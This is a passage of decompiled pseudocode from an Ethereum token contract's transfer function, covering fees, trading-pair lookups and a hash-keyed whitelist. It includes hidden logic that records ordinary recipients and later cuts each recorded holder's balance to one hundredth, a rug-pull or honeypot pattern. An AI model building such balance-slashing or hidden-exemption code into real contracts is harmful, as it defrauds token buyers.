                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _758 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_758] = 26
                    mem[_758 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 'NH{q', 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7059 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7065 = mem[_7059]
                require mem[_7059] == mem[_7059 + 12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7083 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7089 = mem[_7083]
                require mem[_7083] == mem[_7083 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7089)
                require ext_code.size(address(_7065))
                staticcall address(_7065).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7089)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7107 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7107] == mem[_7107 + 12 len 20]
                if arg1 != mem[_7107 + 12 len 20]:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7161 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7179 = mem[_7161]
                    require mem[_7161] == mem[_7161 + 12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7227 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7257 = mem[_7227]
                    require mem[_7227] == mem[_7227 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7257)
                    require ext_code.size(address(_7179))
                    staticcall address(_7179).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7257)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7409 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7476 = mem[_7409]
                    require mem[_7409] == mem[_7409 + 12 len 20]
                    if mem[_7409 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7842 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7842 + 32 len mem[_7842]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7476):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7868 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7868 + 32 len mem[_7868]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7241 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7241 + 32 len mem[_7241]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7167 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7185 = mem[_7167]
                        require mem[_7167] == mem[_7167 + 12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
